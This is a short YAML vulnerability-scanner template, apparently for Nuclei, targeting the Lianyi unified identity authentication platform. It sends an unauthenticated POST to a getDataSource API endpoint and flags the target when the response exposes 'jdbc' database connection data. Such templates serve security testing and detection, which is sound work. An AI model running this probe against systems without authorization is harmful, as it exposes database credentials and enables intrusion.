id: lytyrz-getdatasource-info

info:
  name: lytyrz-getdatasource-info
  author: HB
  severity: high
  description: 联奕统一身份认证平台getDataSource存在信息泄露漏洞

http:
  - raw: 
    - |
      POST /api/bd-mdp/serviceManager/outInterface/getDataSource HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (Linux; Android 11; motorola edge 20 fusion) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36
      Content-Length: 0
      Accept-Charset: utf-8
      Accept-Encoding: gzip, deflate
      Connection: close

    matchers:
      - type: dsl
        dsl:
          - 'status_code==200  && contains_all(body,"jdbc") && contains_all(body,"\"code\":200")'
        